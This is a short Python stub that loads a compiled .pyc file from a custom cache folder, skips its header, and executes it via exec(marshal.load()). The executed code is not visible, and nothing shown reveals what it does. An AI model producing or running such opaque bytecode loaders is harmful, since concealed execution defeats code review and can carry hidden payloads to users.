
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_1bf10ff6d19f4da8a581bb91f3f8babf.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
